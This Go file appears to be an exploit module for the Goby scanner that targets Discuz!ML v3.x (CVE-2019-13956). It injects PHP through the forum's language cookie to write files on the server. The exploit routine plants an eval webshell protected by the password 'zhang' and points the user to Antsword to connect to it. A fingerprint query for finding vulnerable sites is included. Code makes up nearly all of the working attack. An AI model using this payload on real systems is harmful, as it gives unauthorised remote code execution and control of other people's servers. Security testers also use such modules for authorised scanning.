/*
 * @Audit: ovi3
 * @Date: 2022-09-22 18:57:00
 * @Judgments based: 动态获取cookie前缀。在vulfocus discuz!ML 代码执行 （CVE-2019-13956）靶场测试通过
 * @Desc:
 * @Target:
 */

package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"math/rand"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Discuz!ML v3.x GETSHELL",
    "Description": "There is any file upload, arbitrary command execution",
    "Product": "Discuz!ML",
    "Homepage": "https://www.discuz.net/",
    "DisclosureDate": "2021-06-18",
    "Author": "buzhidao",
    "GobyQuery": "app=\"Discuz\" && (body=\"MultiLingual version\"||body=\"Multi-Lingual Javascript Support\")",
    "Level": "3",
    "Impact": "<p>There is any file upload, any command execution, you can get the server permissions</p>",
    "Recommendation": "<p>Upgrade to the latest version</p>",
    "References": [
        "https://blog.csdn.net/god_zzZ/article/details/95912088"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "phpshell",
            "type": "input",
            "value": "<?php eval($_POST[\"zhang\"]);?>"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "File Upload",
        "RCE"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10218"
}`

	getCookiePrefix := func(u *httpclient.FixUrl) string {
		cfg := httpclient.NewGetRequestConfig("/forum.php")
		cfg.VerifyTls = false
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			match := regexp.MustCompile(`(^|;)([^;]*?)_language=`).FindStringSubmatch(resp.Cookie)
			if len(match) > 2 {
				return match[2] + "_"
			}
		}
		return ""
	}

	urlEncodeAllChar := func(s string) string {
		r := ""
		for i, c := range hex.EncodeToString([]byte(s)) {
			if i%2 == 0 {
				r += "%" + string(c)
			} else {
				r += string(c)
			}
		}
		return r
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ssc *scanconfig.SingleScanConfig) bool {
			cookiePrefix := getCookiePrefix(u)
			if len(cookiePrefix) == 0 {
				log.Printf("can not get Discuz!ML cookie prefix for %s\n", u.FixedHostInfo)
				return false
			}

			cfg := httpclient.NewGetRequestConfig("/forum.php")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			rnd := rand.New(rand.NewSource(time.Now().UnixNano()))
			sui := fmt.Sprintf("%06v", rnd.Int31n(1000000))
			payload := "%27. file_put_contents(%27" + sui + ".php%27%2Curldecode(%27%253C%253Fphp echo(md5(88))%253B%2524file %253D __FILE__%253Bif(file_exists(%2524file))%257B%2540unlink (%2524file)%253B%257D%27)).%27"
			coo := fmt.Sprintf("%ssaltkey=cru8KB8g; %slanguage=%s; %slastvisit=1623897831; %ssid=UL9Q00; %slastact=1623918476%%09forum.php%%09; %sonlineusernum=2",
				cookiePrefix, cookiePrefix, payload, cookiePrefix, cookiePrefix, cookiePrefix, cookiePrefix)
			cfg.Header.Store("Cookie", coo)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				cfg := httpclient.NewGetRequestConfig("/" + sui + ".php")

				cfg.VerifyTls = false
				cfg.FollowRedirect = true
				if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
					return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "2a38a4a9316c49e5a833517c45d31070")
				}
				return false
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cookiePrefix := getCookiePrefix(expResult.HostInfo)
			if len(cookiePrefix) == 0 {
				log.Printf("can not get Discuz!ML cookie prefix for %s\n", expResult.HostInfo.FixedHostInfo)
				return expResult
			}

			cfg := httpclient.NewGetRequestConfig("/forum.php")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			rnd := rand.New(rand.NewSource(time.Now().UnixNano()))
			sui := fmt.Sprintf("%06v", rnd.Int31n(1000000))
			phpshell := ss.Params["phpshell"].(string)

			phpshell = urlEncodeAllChar(phpshell) // for urldecode().  payload会被小写化，所以需要把所有字符都URL编码，否则像“_POST”就会被转为“_post”导致payload失效
			phpshell = url.QueryEscape(phpshell)  // for cookie decode
			payload := "%27. file_put_contents(%27" + sui + ".php%27%2Curldecode(%27" + phpshell + "%27)).%27"
			coo := fmt.Sprintf("%ssaltkey=cru8KB8g; %slanguage=%s; %slastvisit=1623897831; %ssid=UL9Q00; %slastact=1623918476%%09forum.php%%09; %sonlineusernum=2",
				cookiePrefix, cookiePrefix, payload, cookiePrefix, cookiePrefix, cookiePrefix, cookiePrefix)
			cfg.Header.Store("Cookie", coo)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = expResult.HostInfo.FixedHostInfo + "/" + sui + ".php\npassword:zhang\nUsing Antsword to connect the webshell "
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}

// Discuz!ml 是多语言版本安装后是显示的是Powered by Discuz! X3.x版本，不会显示ML,fofa中title和body是不能识别的，只有app可以识别但是没有具体版本信息对于的语句，所以优化为app="Discuz" && body="MultiLingual version"，大大增加识别准确率，识别出多语言版本有2,899 条匹配结果 （2,886 条独立IP
